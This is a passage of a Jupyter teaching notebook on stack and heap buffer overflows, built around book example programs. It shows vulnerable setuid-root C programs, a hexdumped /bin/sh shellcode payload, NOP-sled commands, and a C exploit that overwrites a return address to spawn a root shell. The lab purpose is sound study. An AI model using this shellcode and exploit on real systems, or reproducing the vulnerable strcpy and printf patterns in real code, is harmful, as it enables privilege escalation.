      "00000030  31 c0 50 68 2f 2f 73 68  68 2f 62 69 6e 89 e3 31  |1.Ph//shh/bin..1|\r\n",
      "00000040  c9 89 ca 6a 0b 58 cd 80  b4 c2 ff ff              |...j.X......|\r\n",
      "0000004c\r\n"
     ]
    }
   ],
   "source": [
    "! hexdump -C payload.bin"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### from terminal send the payload\n",
    "```bash\n",
    "./stack_overflow_demo.exe $(cat payload.bin)\n",
    "```\n",
    "- now the buffer is at different address"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 112,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "ffffc334"
     ]
    }
   ],
   "source": [
    "! printf \"%x\" $((0xffffc320+20))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 113,
   "metadata": {},
   "outputs": [],
   "source": [
    "# let's create the payload of 76 bytes long, e.g.\n",
    "! ./stack_overflow_demo.exe $(perl -e 'print \"\\x90\"x48'; cat "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### booksrc/notesearch.c has stackoverflow vulnerability\n",
    "- let's look at the source of booksrc/notesearch.c"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 73,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "#include <stdio.h>\r\n",
      "#include <string.h>\r\n",
      "#include <fcntl.h>\r\n",
      "#include <sys/stat.h>\r\n",
      "#include \"hacking.h\"\r\n",
      "\r\n",
      "#define FILENAME \"/var/notes\"\r\n",
      "\r\n",
      "int print_notes(int, int, char *);   // note printing function\r\n",
      "int find_user_note(int, int);        // seek in file for a note for user\r\n",
      "int search_note(char *, char *);     // search for keyword function\r\n",
      "void fatal(char *);                  // fatal error handler\r\n",
      "\r\n",
      "int main(int argc, char *argv[]) {\r\n",
      "\tint userid, printing=1, fd; // file descriptor\r\n",
      "\tchar searchstring[100];\r\n",
      "\r\n",
      "\tif(argc > 1)                        // If there is an arg\r\n",
      "\t\tstrcpy(searchstring, argv[1]);   //   that is the search string\r\n",
      "\telse                                // otherwise\r\n",
      "\t\tsearchstring[0] = 0;             //   search string is empty\r\n",
      "\r\n",
      "\tuserid = getuid();\r\n",
      "\tfd = open(FILENAME, O_RDONLY);   // open the file for read-only access\r\n",
      "\tif(fd == -1)\r\n",
      "\t\tfatal(\"in main() while opening file for reading\");\r\n",
      "\r\n",
      "\twhile(printing)\r\n",
      "\t\tprinting = print_notes(fd, userid, searchstring);\r\n",
      "\tprintf(\"-------[ end of note data ]-------\\n\");\r\n",
      "\tclose(fd);\r\n",
      "}\r\n",
      "\r\n",
      "// A function to print the notes for a given uid that match\r\n",
      "// an optional search string\r\n",
      "// returns 0 at end of file, 1 if there are still more notes\r\n",
      "int print_notes(int fd, int uid, char *searchstring) {\r\n",
      "\tint note_length;\r\n",
      "\tchar byte=0, note_buffer[100];\r\n",
      "\t\r\n",
      "\tnote_length = find_user_note(fd, uid);\r\n",
      "\tif(note_length == -1)  // if end of file reached\r\n",
      "\t\treturn 0;           //   return 0\r\n",
      "\r\n",
      "\tread(fd, note_buffer, note_length); // read note data\r\n",
      "\tnote_buffer[note_length] = 0;       // terminate the string\r\n",
      "\t\r\n",
      "\tif(search_note(note_buffer, searchstring)) // if searchstring found\r\n",
      "\t\tprintf(note_buffer);                    //   print the note\r\n",
      "\treturn 1;\r\n",
      "}\r\n",
      "\r\n",
      "// A function to find the next note for a given userID\r\n",
      "// returns -1 if the end of the file is reached\r\n",
      "// otherwise it returns the length of the found note\r\n",
      "int find_user_note(int fd, int user_uid) {\r\n",
      "\tint note_uid=-1;\r\n",
      "\tunsigned char byte;\r\n",
      "\tint length;\r\n",
      "\r\n",
      "\twhile(note_uid != user_uid) {  // loop until a note for user_uid is found\r\n",
      "\t\tif(read(fd, &note_uid, 4) != 4) // read the uid data\r\n",
      "\t\t\treturn -1; // if 4 bytes aren't read, return end of file code\r\n",
      "\t\tif(read(fd, &byte, 1) != 1) // read the newline separator\r\n",
      "         return -1;\r\n",
      "\r\n",
      "\t\tbyte = length = 0;\r\n",
      "\t\twhile(byte != '\\n') {  // figure out how many bytes to the end of line\r\n",
      "\t\t\tif(read(fd, &byte, 1) != 1) // read a single byte\r\n",
      "\t\t\t\treturn -1;     // if byte isn't read, return end of file code\r\n",
      "\t\t\tlength++;  \r\n",
      "\t\t}\r\n",
      "\t}\r\n",
      "\tlseek(fd, length * -1, SEEK_CUR); // rewind file reading by length bytes\r\n",
      "\r\n",
      "\tprintf(\"[DEBUG] found a %d byte note for user id %d\\n\", length, note_uid);\r\n",
      "\treturn length;\r\n",
      "}\r\n",
      "\r\n",
      "// A function to search a note for a given keyword\r\n",
      "// returns 1 if a match is found, 0 if there is no match\r\n",
      "int search_note(char *note, char *keyword) {\r\n",
      "\tint i, keyword_length, match=0;\r\n",
      "\r\n",
      "\tkeyword_length = strlen(keyword);\r\n",
      "\tif(keyword_length == 0)  // if there is no search string\r\n",
      "\t\treturn 1;              // always \"match\"\r\n",
      "\t\r\n",
      "\tfor(i=0; i < strlen(note); i++) { // iterate over bytes in note\r\n",
      "\t\tif(note[i] == keyword[match])  // if byte matches keyword\r\n",
      "\t\t\tmatch++;   // get ready to check the next byte\r\n",
      "\t\telse {        //   otherwise\r\n",
      "\t\t\tif(note[i] == keyword[0]) // if that byte matches first keyword byte\r\n",
      "\t\t\t\tmatch = 1;  // start the match count at 1\r\n",
      "\t\t\telse\r\n",
      "\t\t\t\tmatch = 0;  // otherwise it is zero\r\n",
      "\t\t}\r\n",
      "\t\tif(match == keyword_length) // if there is a full match\r\n",
      "\t\t\treturn 1;   // return matched\r\n",
      "\t}\r\n",
      "\treturn 0;  // return not matched\r\n",
      "}\r\n",
      "\r\n"
     ]
    }
   ],
   "source": [
    "! cat booksrc/notesearch.c"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 74,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\u001b[01m\u001b[Kbooksrc/notesearch.c:\u001b[m\u001b[K In function ‘\u001b[01m\u001b[Kmain\u001b[m\u001b[K’:\r\n",
      "\u001b[01m\u001b[Kbooksrc/notesearch.c:23:11:\u001b[m\u001b[K \u001b[01;35m\u001b[Kwarning: \u001b[m\u001b[Kimplicit declaration of function ‘\u001b[01m\u001b[Kgetuid\u001b[m\u001b[K’ [\u001b[01;35m\u001b[K-Wimplicit-function-declaration\u001b[m\u001b[K]\r\n",
      "   23 |  userid = \u001b[01;35m\u001b[Kgetuid\u001b[m\u001b[K();\r\n",
      "      |           \u001b[01;35m\u001b[K^~~~~~\u001b[m\u001b[K\r\n",
      "\u001b[01m\u001b[Kbooksrc/notesearch.c:31:2:\u001b[m\u001b[K \u001b[01;35m\u001b[Kwarning: \u001b[m\u001b[Kimplicit declaration of function ‘\u001b[01m\u001b[Kclose\u001b[m\u001b[K’; did you mean ‘\u001b[01m\u001b[Kpclose\u001b[m\u001b[K’? [\u001b[01;35m\u001b[K-Wimplicit-function-declaration\u001b[m\u001b[K]\r\n",
      "   31 |  \u001b[01;35m\u001b[Kclose\u001b[m\u001b[K(fd);\r\n",
      "      |  \u001b[01;35m\u001b[K^~~~~\u001b[m\u001b[K\r\n",
      "      |  \u001b[32m\u001b[Kpclose\u001b[m\u001b[K\r\n",
      "\u001b[01m\u001b[Kbooksrc/notesearch.c:\u001b[m\u001b[K In function ‘\u001b[01m\u001b[Kprint_notes\u001b[m\u001b[K’:\r\n",
      "\u001b[01m\u001b[Kbooksrc/notesearch.c:45:2:\u001b[m\u001b[K \u001b[01;35m\u001b[Kwarning: \u001b[m\u001b[Kimplicit declaration of function ‘\u001b[01m\u001b[Kread\u001b[m\u001b[K’; did you mean ‘\u001b[01m\u001b[Kfread\u001b[m\u001b[K’? [\u001b[01;35m\u001b[K-Wimplicit-function-declaration\u001b[m\u001b[K]\r\n",
      "   45 |  \u001b[01;35m\u001b[Kread\u001b[m\u001b[K(fd, note_buffer, note_length); // read note data\r\n",
      "      |  \u001b[01;35m\u001b[K^~~~\u001b[m\u001b[K\r\n",
      "      |  \u001b[32m\u001b[Kfread\u001b[m\u001b[K\r\n",
      "\u001b[01m\u001b[Kbooksrc/notesearch.c:\u001b[m\u001b[K In function ‘\u001b[01m\u001b[Kfind_user_note\u001b[m\u001b[K’:\r\n",
      "\u001b[01m\u001b[Kbooksrc/notesearch.c:74:2:\u001b[m\u001b[K \u001b[01;35m\u001b[Kwarning: \u001b[m\u001b[Kimplicit declaration of function ‘\u001b[01m\u001b[Klseek\u001b[m\u001b[K’; did you mean ‘\u001b[01m\u001b[Kfseek\u001b[m\u001b[K’? [\u001b[01;35m\u001b[K-Wimplicit-function-declaration\u001b[m\u001b[K]\r\n",
      "   74 |  \u001b[01;35m\u001b[Klseek\u001b[m\u001b[K(fd, length * -1, SEEK_CUR); // rewind file reading by length bytes\r\n",
      "      |  \u001b[01;35m\u001b[K^~~~~\u001b[m\u001b[K\r\n",
      "      |  \u001b[32m\u001b[Kfseek\u001b[m\u001b[K\r\n"
     ]
    }
   ],
   "source": [
    "# lets compile notesearch.c to a binary\n",
    "! ./compile.sh booksrc/notesearch.c notesearch.exe"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### notesearch program finds note from /var/notes priviledged folder\n",
    "- change ownership to root and setuid\n",
    "\n",
    "```bash\n",
    "$ sudo chown root:root notesearch.exe\n",
    "$ sudo chmod +s notesearch.exe\n",
    "```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 75,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "-rwsr-sr-x 1 root root 19928 Apr 27 13:42 notesearch.exe\r\n"
     ]
    }
   ],
   "source": [
    "# let's see the detail of notesearch.exe\n",
    "! ls -al notesearch.exe"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! ./notesearch.exe $(perl -e 'print \"A\"x60')"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### notesearch exploit\n",
    "- booksrc has provide exploit code written in C\n",
    "- shellcode is modified to work on modern x86 kernel\n",
    "- let's compile and run the exploit code in terminal"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 77,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "#include <stdio.h>\r\n",
      "#include <stdlib.h>\r\n",
      "#include <string.h>\r\n",
      "char shellcode[]= \r\n",
      "\"\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x99\\xb0\\xa4\\xcd\\x80\\x6a\\x0b\\x58\\x51\\x68\"\r\n",
      "\"\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x51\\x89\\xe2\\x53\\x89\"\r\n",
      "\"\\xe1\\xcd\\x80\";\r\n",
      "\r\n",
      "int main(int argc, char *argv[]) {\r\n",
      "   unsigned int i, *ptr, ret, offset=224;\r\n",
      "   char *command, *buffer;\r\n",
      "\r\n",
      "   command = (char *) malloc(200);\r\n",
      "   bzero(command, 200); // zero out the new memory\r\n",
      "\r\n",
      "   strcpy(command, \"./notesearch.exe \\'\"); // start command buffer\r\n",
      "   buffer = command + strlen(command); // set buffer at the end\r\n",
      "\r\n",
      "   if(argc > 1) // set offset\r\n",
      "      offset = atoi(argv[1]);\r\n",
      "\r\n",
      "   ret = (unsigned int) &i - offset; // set return address\r\n",
      "\r\n",
      "   for(i=0; i < 160; i+=4) // fill buffer with return address\r\n",
      "      *((unsigned int *)(buffer+i)) = ret;\r\n",
      "   memset(buffer, 0x90, 60); // build NOP sled\r\n",
      "   memcpy(buffer+60, shellcode, sizeof(shellcode)-1); \r\n",
      "\r\n",
      "   strcat(command, \"\\'\");\r\n",
      "\r\n",
      "   system(command); // run exploit\r\n",
      "   free(command);\r\n",
      "}\r\n",
      "\r\n"
     ]
    }
   ],
   "source": [
    "# let's look at the exploit code\n",
    "! cat booksrc/exploit_notesearch.c"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 76,
   "metadata": {},
   "outputs": [],
   "source": [
    "# let's compile the exploit code\n",
    "# if you know the exact offset; modify the value of offset and compile\n",
    "# if not don't worry about it, you can try and guess!\n",
    "! ./compile.sh booksrc/exploit_notesearch.c exploit_notesearch.exe"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### run the exploit\n",
    "- run the exploit_notesearch.exe from the terminal\n",
    "- use wrapper bash script booksrc/exploit_notesearch.sh to try different offset\n",
    "\n",
    "```bash\n",
    "$ ./exploit_notesearch.exe\n",
    "$ bash exploit_notesearch.sh\n",
    "```\n",
    "- change the range if you still do not get the shell"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Heap Overflow\n",
    "- buffer overflow can happen in other segments such as **heap**, **data** and **bss**\n",
    "- if an important variable is located after a buffer vulnerable to an overflow, the program's control flow can be altered (regardless of the memory segment)\n",
    "    - controls may be limited\n",
    "- not standarized as stack overflow but can be just as effective\n",
    "\n",
    "### booksrc/notetaker.c is susceptible to heap overflow\n",
    "```strcpy(buffer, argv[1]); // problem!\n",
    "```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 78,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "#include <stdio.h>\r\n",
      "#include <stdlib.h>\r\n",
      "#include <string.h>\r\n",
      "#include <fcntl.h>\r\n",
      "#include <sys/stat.h>\r\n",
      "#include \"hacking.h\"\r\n",
      "\r\n",
      "void usage(char *prog_name, char *filename) {\r\n",
      "   printf(\"Usage: %s <data to add to %s>\\n\", prog_name, filename);\r\n",
      "   exit(0);\r\n",
      "}\r\n",
      "\r\n",
      "void fatal(char *);            // a function for fatal errors\r\n",
      "void *ec_malloc(unsigned int); // an errorchecked malloc() wrapper\r\n",
      "\r\n",
      "int main(int argc, char *argv[]) {\r\n",
      "   int userid, fd; // file descriptor\r\n",
      "   char *buffer, *datafile;\r\n",
      "\r\n",
      "   buffer = (char *) ec_malloc(100);\r\n",
      "   datafile = (char *) ec_malloc(20);\r\n",
      "   strcpy(datafile, \"/var/notes\");\r\n",
      "\r\n",
      "   if(argc < 2)                // If there aren't commandline arguments\r\n",
      "      usage(argv[0], datafile); // display usage message and exit\r\n",
      "\r\n",
      "   strcpy(buffer, argv[1]);  // copy into buffer\r\n",
      "\r\n",
      "   printf(\"[DEBUG] buffer   @ %p: \\'%s\\'\\n\", buffer, buffer);\r\n",
      "   printf(\"[DEBUG] datafile @ %p: \\'%s\\'\\n\", datafile, datafile);\r\n",
      "\r\n",
      " // Opening the file\r\n",
      "   fd = open(datafile, O_WRONLY|O_CREAT|O_APPEND, S_IRUSR|S_IWUSR);\r\n",
      "   if(fd == -1)\r\n",
      "      fatal(\"in main() while opening file\");\r\n",
      "   printf(\"[DEBUG] file descriptor is %d\\n\", fd);\r\n",
      "\r\n",
      "   userid = getuid(); // get the real user ID\r\n",
      "\r\n",
      "// Writing data\r\n",
      "   if(write(fd, &userid, 4) == -1) // write user ID before note data\r\n",
      "      fatal(\"in main() while writing userid to file\");\r\n",
      "   write(fd, \"\\n\", 1); // terminate line\r\n",
      "\r\n",
      "   if(write(fd, buffer, strlen(buffer)) == -1) // write note\r\n",
      "      fatal(\"in main() while writing buffer to file\");\r\n",
      "   write(fd, \"\\n\", 1); // terminate line\r\n",
      "\r\n",
      "// Closing file\r\n",
      "   if(close(fd) == -1)\r\n",
      "      fatal(\"in main() while closing file\");\r\n",
      "\r\n",
      "   printf(\"Note has been saved.\\n\");\r\n",
      "   free(buffer);\r\n",
      "   free(datafile);\r\n",
      "}\r\n"
     ]
    }
   ],
   "source": [
    "! cat booksrc/notetaker.c"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 79,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\u001b[01m\u001b[K./booksrc/notetaker.c:\u001b[m\u001b[K In function ‘\u001b[01m\u001b[Kmain\u001b[m\u001b[K’:\r\n",
      "\u001b[01m\u001b[K./booksrc/notetaker.c:38:13:\u001b[m\u001b[K \u001b[01;35m\u001b[Kwarning: \u001b[m\u001b[Kimplicit declaration of function ‘\u001b[01m\u001b[Kgetuid\u001b[m\u001b[K’ [\u001b[01;35m\u001b[K-Wimplicit-function-declaration\u001b[m\u001b[K]\r\n",
      "   38 |    userid = \u001b[01;35m\u001b[Kgetuid\u001b[m\u001b[K(); // get the real user ID\r\n",
      "      |             \u001b[01;35m\u001b[K^~~~~~\u001b[m\u001b[K\r\n",
      "\u001b[01m\u001b[K./booksrc/notetaker.c:41:7:\u001b[m\u001b[K \u001b[01;35m\u001b[Kwarning: \u001b[m\u001b[Kimplicit declaration of function ‘\u001b[01m\u001b[Kwrite\u001b[m\u001b[K’; did you mean ‘\u001b[01m\u001b[Kfwrite\u001b[m\u001b[K’? [\u001b[01;35m\u001b[K-Wimplicit-function-declaration\u001b[m\u001b[K]\r\n",
      "   41 |    if(\u001b[01;35m\u001b[Kwrite\u001b[m\u001b[K(fd, &userid, 4) == -1) // write user ID before note data\r\n",
      "      |       \u001b[01;35m\u001b[K^~~~~\u001b[m\u001b[K\r\n",
      "      |       \u001b[32m\u001b[Kfwrite\u001b[m\u001b[K\r\n",
      "\u001b[01m\u001b[K./booksrc/notetaker.c:50:7:\u001b[m\u001b[K \u001b[01;35m\u001b[Kwarning: \u001b[m\u001b[Kimplicit declaration of function ‘\u001b[01m\u001b[Kclose\u001b[m\u001b[K’; did you mean ‘\u001b[01m\u001b[Kpclose\u001b[m\u001b[K’? [\u001b[01;35m\u001b[K-Wimplicit-function-declaration\u001b[m\u001b[K]\r\n",
      "   50 |    if(\u001b[01;35m\u001b[Kclose\u001b[m\u001b[K(fd) == -1)\r\n",
      "      |       \u001b[01;35m\u001b[K^~~~~\u001b[m\u001b[K\r\n",
      "      |       \u001b[32m\u001b[Kpclose\u001b[m\u001b[K\r\n"
     ]
    }
   ],
   "source": [
    "# let's compile notetaker.c\n",
    "! ./compile.sh ./booksrc/notetaker.c notetaker.exe"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### notetaker.exe must be setuid root program \n",
    "- all users in the system can take their own notes by writing to /var/notes file\n",
    "\n",
    "```bash\n",
    "$ sudo chown root:root notetaker.exe\n",
    "$ sudo chmod u+s notetaker.exe\n",
    "```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 80,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "-rwsr-sr-x 1 root root 19248 Apr 29 13:14 ./notetaker.exe\n"
     ]
    }
   ],
   "source": [
    "%%bash\n",
    "ls -al ./notetaker.exe"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 81,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[DEBUG] buffer   @ 0x804d1a0: 'new note for user'\n",
      "[DEBUG] datafile @ 0x804d210: '/var/notes'\n",
      "[DEBUG] file descriptor is 3\n",
      "Note has been saved.\n"
     ]
    }
   ],
   "source": [
    "%%bash\n",
    "./notetaker.exe \"new note for user\""
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## overflowing buffer by corrupting datafile\n",
    "- how far down is datafile from buffer (the offset)\n",
    "- see source code and try to guess\n",
    "- use gdb; subtract the address of buffer from the address of datafile"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 84,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[DEBUG] buffer   @ 0x804d1a0: 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n",
      "[DEBUG] datafile @ 0x804d210: ''\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "[!!] Fatal Error in main() while opening file: No such file or directory\n"
     ]
    },
    {
     "ename": "CalledProcessError",
     "evalue": "Command 'b'./notetaker.exe $(perl -e \\'print \"A\"x112\\')\\n# make datafile empty!\\n'' returned non-zero exit status 255.",
     "output_type": "error",
     "traceback": [
      "\u001b[0;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[0;31mCalledProcessError\u001b[0m                        Traceback (most recent call last)",
      "\u001b[0;32m<ipython-input-84-300fde2e08a8>\u001b[0m in \u001b[0;36m<module>\u001b[0;34m\u001b[0m\n\u001b[0;32m----> 1\u001b[0;31m \u001b[0mget_ipython\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mrun_cell_magic\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m'bash'\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0;34m''\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0;34m'./notetaker.exe $(perl -e \\'print \"A\"x112\\')\\n# make datafile empty!\\n'\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m",
      "\u001b[0;32m~/miniconda3/lib/python3.7/site-packages/IPython/core/interactiveshell.py\u001b[0m in \u001b[0;36mrun_cell_magic\u001b[0;34m(self, magic_name, line, cell)\u001b[0m\n\u001b[1;32m   2321\u001b[0m             \u001b[0mmagic_arg_s\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mvar_expand\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mline\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mstack_depth\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m   2322\u001b[0m             \u001b[0;32mwith\u001b[0m \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mbuiltin_trap\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m-> 2323\u001b[0;31m                 \u001b[0mresult\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mfn\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mmagic_arg_s\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mcell\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m   2324\u001b[0m             \u001b[0;32mreturn\u001b[0m \u001b[0mresult\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m   2325\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;32m~/miniconda3/lib/python3.7/site-packages/IPython/core/magics/script.py\u001b[0m in \u001b[0;36mnamed_script_magic\u001b[0;34m(line, cell)\u001b[0m\n\u001b[1;32m    140\u001b[0m             \u001b[0;32melse\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    141\u001b[0m                 \u001b[0mline\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mscript\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 142\u001b[0;31m             \u001b[0;32mreturn\u001b[0m \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mshebang\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mline\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mcell\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    143\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    144\u001b[0m         \u001b[0;31m# write a basic docstring:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;32m</home/user/miniconda3/lib/python3.7/site-packages/decorator.py:decorator-gen-109>\u001b[0m in \u001b[0;36mshebang\u001b[0;34m(self, line, cell)\u001b[0m\n",
      "\u001b[0;32m~/miniconda3/lib/python3.7/site-packages/IPython/core/magic.py\u001b[0m in \u001b[0;36m<lambda>\u001b[0;34m(f, *a, **k)\u001b[0m\n\u001b[1;32m    185\u001b[0m     \u001b[0;31m# but it's overkill for just that one bit of state.\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    186\u001b[0m     \u001b[0;32mdef\u001b[0m \u001b[0mmagic_deco\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0marg\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 187\u001b[0;31m         \u001b[0mcall\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0;32mlambda\u001b[0m \u001b[0mf\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0;34m*\u001b[0m\u001b[0ma\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0;34m**\u001b[0m\u001b[0mk\u001b[0m\u001b[0;34m:\u001b[0m \u001b[0mf\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m*\u001b[0m\u001b[0ma\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0;34m**\u001b[0m\u001b[0mk\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    188\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    189\u001b[0m         \u001b[0;32mif\u001b[0m \u001b[0mcallable\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0marg\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;32m~/miniconda3/lib/python3.7/site-packages/IPython/core/magics/script.py\u001b[0m in \u001b[0;36mshebang\u001b[0;34m(self, line, cell)\u001b[0m\n\u001b[1;32m    243\u001b[0m             \u001b[0msys\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mstderr\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mflush\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    244\u001b[0m         \u001b[0;32mif\u001b[0m \u001b[0margs\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mraise_error\u001b[0m \u001b[0;32mand\u001b[0m \u001b[0mp\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mreturncode\u001b[0m\u001b[0;34m!=\u001b[0m\u001b[0;36m0\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 245\u001b[0;31m             \u001b[0;32mraise\u001b[0m \u001b[0mCalledProcessError\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mp\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mreturncode\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mcell\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0moutput\u001b[0m\u001b[0;34m=\u001b[0m\u001b[0mout\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mstderr\u001b[0m\u001b[0;34m=\u001b[0m\u001b[0merr\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    246\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    247\u001b[0m     \u001b[0;32mdef\u001b[0m \u001b[0m_run_script\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mself\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mp\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mcell\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mto_close\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;31mCalledProcessError\u001b[0m: Command 'b'./notetaker.exe $(perl -e \\'print \"A\"x112\\')\\n# make datafile empty!\\n'' returned non-zero exit status 255."
     ]
    }
   ],
   "source": [
    "%%bash\n",
    "./notetaker.exe $(perl -e 'print \"A\"x112')\n",
    "# make datafile empty!"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 88,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "-rw------- 1 root root 126 Apr 29 13:25 testfile\r\n"
     ]
    }
   ],
   "source": [
    "# let's make sure testfile doesn't exist in the current director\n",
    "! ls -al testfile"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 85,
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "double free or corruption (out)\n",
